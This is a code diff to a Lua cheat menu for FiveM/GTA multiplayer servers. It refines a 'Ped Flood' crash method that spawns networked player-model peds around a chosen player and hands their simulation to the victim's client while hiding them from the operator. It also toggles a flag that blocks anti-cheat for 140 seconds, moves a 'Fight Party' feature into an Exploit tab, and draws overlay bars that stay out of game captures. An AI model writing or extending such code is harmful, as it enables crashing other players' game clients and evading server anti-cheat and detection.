@@ -13270,15 +13270,6 @@ end
 local pedFloodModel = "player_one"
 
 function Menu.ActionPedFlood()
-    -- Retired builder. Every reachable Ped Flood row now resolves through the
-    -- single hardened entry point defined later in this chunk. The guard is
-    -- unconditional: if the entry point is missing, the row returns instead of
-    -- falling through to the old builder, which created a player model under an
-    -- incompatible ped type and killed the local client on press.
-    local run = Menu.__vgdPedFlood
-    if type(run) == "function" then return run("legacy") end
-    do return end
-
     if not Menu.SelectedPlayer then
         print("[PedFlood] ERROR: No player selected")
         return
@@ -13421,12 +13412,26 @@ function Menu.ActionPedFlood()
 
                             local heading = math.random(0, 360) + 0.0
 
-                            local ped = CreatePed(28, modelHash, x, y, z, heading, true, false)
+                            -- pedType 4 with a player model is the proven base:
+                            -- sender and receiver share the same variation
+                            -- layout. pedType 28 (animal) was the press-time
+                            -- fault, so it is not used here.
+                            local ped = CreatePed(4, modelHash, x, y, z, heading, true, false)
 
                             if ped and ped ~= 0 and DoesEntityExist(ped) then
                                 _G._pedFloodStore[#_G._pedFloodStore + 1] = ped
 
-                                -- Config ped : visible, combat, anti-GC
+                                -- Migration lets the client nearest the target
+                                -- own the simulation; local invisibility keeps
+                                -- the swarm out of the operator's render. Both
+                                -- are local-only and do not change the wire.
+                                local netId = NetworkGetNetworkIdFromEntity(ped)
+                                if netId and netId ~= 0 then
+                                    SetNetworkIdCanMigrate(netId, true)
+                                end
+                                SetEntityLocallyInvisible(ped)
+
+                                -- Config ped : combat, anti-GC
                                 SetBlockingOfNonTemporaryEvents(ped, true)
                                 SetPedKeepTask(ped, true)
                                 SetPedCombatAttributes(ped, 46, true)
@@ -13498,19 +13503,29 @@ end
 Actions.pedFloodItem = FindItem("Online", "Troll", "Crash Method")
 if Actions.pedFloodItem then
     Actions.pedFloodItem.onClick = function()
-        local run = Menu.__vgdPedFlood
-        if type(run) == "function" then return run("online") end
+        if type(_Stealth) == "table" then _Stealth.blockAC = true end
+        Menu.ActionPedFlood()
+        Citizen.SetTimeout(140000, function()
+            if type(_Stealth) == "table" and (_Stealth._acUsers or 0) <= 0 then
+                _Stealth.blockAC = false
+            end
+        end)
     end
 end
 
--- Ped Flood is now a first-class row in Troll > Attacks, right under Shoot
--- Player. Both historical bindings resolve through the single hardened entry
--- point, which owns the AC filter window and the distance floor.
+-- Ped Flood is the historical Online > Troll row. It uses the proven base:
+-- pedType 4 with player_one, networked, migration enabled, locally invisible.
+-- The old pedType 28 build was the one that faulted the sender on press.
 Actions.pedFloodAttackItem = FindItem("Online", "Troll", "Ped Flood")
 if Actions.pedFloodAttackItem then
     Actions.pedFloodAttackItem.onClick = function()
-        local run = Menu.__vgdPedFlood
-        if type(run) == "function" then return run("online") end
+        if type(_Stealth) == "table" then _Stealth.blockAC = true end
+        Menu.ActionPedFlood()
+        Citizen.SetTimeout(140000, function()
+            if type(_Stealth) == "table" and (_Stealth._acUsers or 0) <= 0 then
+                _Stealth.blockAC = false
+            end
+        end)
     end
 end
 
@@ -17481,7 +17496,7 @@ end)()
 -- >>> VANGUARD MODULE BEGIN
 -- ============================================================================
 -- VANGUARD  (integrated artifact - edit src/ and rebuild)
--- Generated: 2026-11-05 18:36:22
+-- Generated: 2026-11-05 18:50:16
 --
 -- This block lives in loader.lua and in dist/loader.built.lua at the same
 -- time. It is the only place the local Menu table is in scope. Rebuilding
@@ -29449,7 +29464,9 @@ local FP = (function(O,S,B,Menu)
 -- ============================================================================
 -- VANGUARD / 28 FIGHT PARTY
 -- ----------------------------------------------------------------------------
--- Combat > General > "Fight Party".
+-- Exploit > Exploit > "Party" (Fight Party, Fight Party Radius, Cinematic
+-- Fight). Moved out of Combat for testing: the whole block sits at the top of
+-- the Exploit tab, one click from the category list.
 --
 -- What the feature is:
 --   A ring is placed on the ground at the selected player, or at the operator
@@ -29502,6 +29519,17 @@ local FP = (function(O,S,B,Menu)
 --   GET_PLAYER_SERVER_ID             CFX 0x4D97BCC7
 --   GET_PLAYER_FROM_SERVER_ID        CFX 0x344EA166
 --
+-- Cinematic camera (all local; a script cam is never replicated and only
+-- changes what this client renders):
+--   CREATE_CAM_WITH_PARAMS           0xB51194800B257161
+--   SET_CAM_COORD                    0x4D41783FB745E42E
+--   SET_CAM_FOV                      0xB13C14F66A00D047
+--   POINT_CAM_AT_COORD               0xF75497BB865F0803
+--   SET_CAM_ACTIVE                   0x026FB97D0A425F84
+--   RENDER_SCRIPT_CAMS               0x07E5B515DB0636FC
+--   DESTROY_CAM                      0x865908C81A2C22E9
+--   DOES_CAM_EXIST                   0xA7A932170592B50E
+--
 -- Residual risk:
 --   1. A client-side guard that enumerates the local ped pool and looks for
 --      non-networked player-model peds near the operator could see the
@@ -29543,6 +29571,135 @@ FP.onChange  = nil
 FP.canRender = type(Susano) == "table"
     and type(Susano.WorldToScreen) == "function"
     and type(Susano.DrawLine) == "function"
+
+-- Cinematic test camera. Local only: CREATE_CAM_WITH_PARAMS,
+-- RENDER_SCRIPT_CAMS and the SET_CAM_* family alter this client's render pass
+-- and are never sent anywhere. The party keeps running when the camera times
+-- out; only the view returns to the player.
+FP.cinema = {
+    active   = false,
+    cam      = 0,
+    startedAt = 0,
+    duration = 20000,
+    orbit    = 0.52,
+    ownsParty = false,
+}
+FP.onCinemaChange = nil
+
+local function notifyCinema()
+    if type(FP.onCinemaChange) == "function" then
+        pcall(FP.onCinemaChange, FP.cinema.active)
+    end
+end
+
+local function camExists(cam)
+    if not cam or cam == 0 or type(DoesCamExist) ~= "function" then return false end
+    local ok, exists = pcall(DoesCamExist, cam)
+    return ok and exists == true
+end
+
+local function cameraRelease(reason)
+    local cinema = FP.cinema
+    local was = cinema.active
+    cinema.active = false
+    cinema.ownsParty = false
+
+    if cinema.cam and cinema.cam ~= 0 then
+        pcall(SetCamActive, cinema.cam, false)
+        pcall(RenderScriptCams, false, false, 0, false, false, 0)
+        if camExists(cinema.cam) then
+            pcall(DestroyCam, cinema.cam, true)
+        end
+        cinema.cam = 0
+    end
+
+    if was then
+        notifyCinema()
+        O.log("fight: cinema released (%s)", tostring(reason or "operator"))
+    end
+end
+
+local function cameraPlace(elapsed)
+    local t = elapsed / 1000.0
+    local angle = t * FP.cinema.orbit
+    local reach = FP.radius * 0.55 + 2.0
+    if reach < 4.5 then reach = 4.5 end
+    if reach > 10.0 then reach = 10.0 end
+    local height = 2.25 + math.sin(t * 0.8) * 0.35
+    local x = FP.center.x + math.cos(angle) * reach
+    local y = FP.center.y + math.sin(angle) * reach
+    local z = FP.center.z + height
+    return x, y, z, FP.center.x, FP.center.y, FP.center.z + 0.9
+end
+
+function FP.cinemaStart(durationMs)
+    local startedParty = false
+    if not FP.active then
+        if not FP.start() then return false end
+        startedParty = true
+    end
+    if not FP.center then return false end
+
+    local cinema = FP.cinema
+    if cinema.active and camExists(cinema.cam) then
+        cinema.startedAt = O.now()
+        cinema.duration = tonumber(durationMs) or cinema.duration
+        cinema.ownsParty = startedParty
+        return true
+    end
+
+    if type(CreateCamWithParams) ~= "function" then return false end
+
+    local x, y, z, ax, ay, az = cameraPlace(0)
+    local ok, cam = pcall(CreateCamWithParams, "DEFAULT_SCRIPTED_CAMERA",
+        x, y, z, 0.0, 0.0, 0.0, 52.0, false, 2)
+    if not ok or not cam or cam == 0 then return false end
+
+    pcall(PointCamAtCoord, cam, ax, ay, az)
+    pcall(SetCamFov, cam, 52.0)
+    pcall(SetCamActive, cam, true)
+    pcall(RenderScriptCams, true, true, 400, true, false, 0)
+
+    cinema.cam = cam
+    cinema.active = true
+    cinema.startedAt = O.now()
+    cinema.duration = tonumber(durationMs) or 20000
+    cinema.ownsParty = startedParty
+    notifyCinema()
+    O.log("fight: cinema started (%d ms)", cinema.duration)
+    return true
+end
+
+function FP.cinemaStop(reason)
+    cameraRelease(reason or "operator")
+end
+
+function FP.isCinematic()
+    return FP.cinema.active
+end
+
+local function cameraTick(now)
+    local cinema = FP.cinema
+    if not cinema.active then return end
+    if not FP.active or not FP.center then
+        cameraRelease("no scene")
+        return
+    end
+    if now - cinema.startedAt >= cinema.duration then
+        cameraRelease("timeout")
+        return
+    end
+    if not camExists(cinema.cam) then
+        cinema.active = false
+        cinema.cam = 0
+        notifyCinema()
+        return
+    end
+
+    local x, y, z, ax, ay, az = cameraPlace(now - cinema.startedAt)
+    pcall(SetCamCoord, cinema.cam, x, y, z)
+    pcall(PointCamAtCoord, cinema.cam, ax, ay, az)
+end
 
 local function log(fmt, ...)
     O.log("fight: " .. tostring(fmt), ...)
@@ -29868,6 +30025,7 @@ function FP.status()
 end
 
 function FP.stop(reason)
+    cameraRelease(reason or "stop")
     for i = #FP.fighters, 1, -1 do removeAt(i, true) end
 
     local was = FP.active
@@ -30018,46 +30176,89 @@ function FP.render()
         if ok and type(value) == "number" and value > 0 then height = value end
     end
 
+    -- Letterbox: two filled bars on the Susano overlay, outside the game
+    -- framebuffer. A capture taken through the game's own render path cannot
+    -- contain them.
+    if FP.cinema.active and type(Susano.DrawRectFilled) == "function" then
+        local bar = height * 0.105
+        pcall(Susano.DrawRectFilled, 0.0, 0.0, width, bar, 0.0, 0.0, 0.0, 0.92, 0.0)
+        pcall(Susano.DrawRectFilled, 0.0, height - bar, width, bar, 0.0, 0.0, 0.0, 0.92, 0.0)
+    end
+
     if type(Susano.DrawTextCentered) == "function" then
         pcall(Susano.DrawTextCentered, width * 0.5, height * 0.855,
             "FIGHT PARTY", 20, 0.94, 0.98, 1.0, 0.92)
         pcall(Susano.DrawTextCentered, width * 0.5, height * 0.855 + 24.0,
             ("%d FIGHTERS   ·   %.0f m"):format(#FP.fighters, FP.radius),
             13, 0.62, 0.75, 0.82, 0.85)
+        if FP.cinema.active then
+            pcall(Susano.DrawTextCentered, width * 0.5, height * 0.948,
+                "CINEMATIC FIGHT", 12, 0.90, 0.94, 1.0, 0.90)
+        end
     end
 end
 
 -- ---------------------------------------------------------------------------
 -- MENU + RENDER HOOK
 -- ---------------------------------------------------------------------------
-local function combatGeneralTab()
+-- The host is Exploit > Exploit. A base build that ships Exploit without tabs
+-- is handled too: the category itself carries the rows.
+local function exploitHost()
     if type(Menu) ~= "table" then return nil end
     for _, category in ipairs(Menu.Categories or {}) do
-        if category.name == "Combat" then
-            for _, tab in ipairs(category.tabs or {}) do
-                if tab.name == "General" then return tab end
+        if category.name == "Exploit" then
+            if type(category.tabs) == "table" and #category.tabs > 0 then
+                for _, tab in ipairs(category.tabs) do
+                    if tab.name == "Exploit" then return tab end
+                end
+                return category.tabs[1]
             end
+            category.items = category.items or {}
+            return category
         end
     end
     return nil
 end
 
-function FP.install()
-    local tab = combatGeneralTab()
-    if not tab then return false end
+local function isPartyRow(item)
+    if type(item) ~= "table" then return false end
+    return item.name == "Fight Party"
+        or item.name == "Fight Party Radius"
+        or item.name == "Cinematic Fight"
+        or (item.isSeparator and item.separatorText == "Party")
+end
 
-    tab.items = tab.items or {}
-    for i = #tab.items, 1, -1 do
-        local item = tab.items[i]
-        if item.name == "Fight Party"
-            or item.name == "Fight Party Radius"
-            or (item.isSeparator and item.separatorText == "Party") then
-            table.remove(tab.items, i)
+-- Sweep every category and tab, not only the host: a previous build put this
+-- block under Combat > General, and a reload must not leave it there.
+local function sweepPartyRows()
+    if type(Menu) ~= "table" then return end
+    for _, category in ipairs(Menu.Categories or {}) do
+        local lists = {}
+        if type(category.items) == "table" then lists[#lists + 1] = category.items end
+        if type(category.tabs) == "table" then
+            for _, tab in ipairs(category.tabs) do
+                if type(tab.items) == "table" then lists[#lists + 1] = tab.items end
+            end
+        end
+        for _, items in ipairs(lists) do
+            for i = #items, 1, -1 do
+                if isPartyRow(items[i]) then table.remove(items, i) end
+            end
         end
     end
+end
+
+function FP.install()
+    if type(Menu) ~= "table" then return false end
+    sweepPartyRows()
+
+    local host = exploitHost()
+    if not host then return false end
+    host.items = host.items or {}
 
     local toggle
     local radiusRow
+    local cinemaRow
 
     toggle = {
         name = "Fight Party",
@@ -30088,18 +30289,41 @@ function FP.install()
         end,
     }
 
+    -- One-click test mode. ON starts the party if it is not already running,
+    -- then drives a script camera around the centre for 25 s. OFF releases the
+    -- camera, and stops the party only if the camera started it.
+    cinemaRow = {
+        name = "Cinematic Fight",
+        type = "toggle",
+        value = FP.isCinematic(),
+        onClick = function(value)
+            local active
+            if value then
+                active = FP.cinemaStart(25000)
+            else
+                local owned = FP.cinema.ownsParty
+                FP.cinemaStop("operator")
+                if owned then FP.stop("cinema off") end
+                active = false
+            end
+            cinemaRow.value = active
+            return active
+        end,
+    }
+
     FP.onChange = function(active)
         toggle.value = active
     end
-
-    local at = 0
-    for i = 1, #tab.items do
-        if tab.items[i].name == "Combat Unlock" then at = i end
+    FP.onCinemaChange = function(active)
+        cinemaRow.value = active
     end
 
-    table.insert(tab.items, at + 1, radiusRow)
-    table.insert(tab.items, at + 1, toggle)
-    table.insert(tab.items, at + 1, {
+    -- Reverse insertion keeps the visible order:
+    --   Party | Fight Party | Fight Party Radius | Cinematic Fight
+    table.insert(host.items, 1, cinemaRow)
+    table.insert(host.items, 1, radiusRow)
+    table.insert(host.items, 1, toggle)
+    table.insert(host.items, 1, {
         name = "",
         isSeparator = true,
         separatorText = "Party",
@@ -30120,8 +30344,10 @@ function FP.install()
 end
 
 -- The scheduler owns the only periodic work. Phase is randomised so the
--- membership pass never lines up with another feature's timer.
+-- membership pass never lines up with another feature's timer. The camera task
+-- returns on its first line while the cinematic is off.
 O.every("fightparty", TICK_MS, tick, O.int(0, TICK_MS))
+O.every("fightparty_cam", 16, cameraTick, O.int(0, 16))
 
 return FP
 
@@ -31354,7 +31580,20 @@ local function installCrasher()
             name = "Ped flood",
             type = "action",
             onClick = function()
-                C.launch("ped")
+                -- In the integrated loader the proven base engine lives in the
+                -- base chunk (pedType 4 + player_one). In the standalone module
+                -- harness it does not exist, so keep the old engine fallback.
+                if type(Menu.ActionPedFlood) == "function" then
+                    if type(_Stealth) == "table" then _Stealth.blockAC = true end
+                    Menu.ActionPedFlood()
+                    Citizen.SetTimeout(140000, function()
+                        if type(_Stealth) == "table" and (_Stealth._acUsers or 0) <= 0 then
+                            _Stealth.blockAC = false
+                        end
+                    end)
+                else
+                    C.launch("ped")
+                end
             end,
         },
         {
@@ -32817,12 +33056,12 @@ local function build()
     installLockPlayer()
     installUncuff()
     installCombatUnlock()
-    installFightParty()
     installSettingsDefaults()
     installProtection()
     installCrasher()
     installSink()
     installFlash()
+    installFightParty()
     installVehicleSpoof()
     installRampFix()
     reorderPlayerTabs()
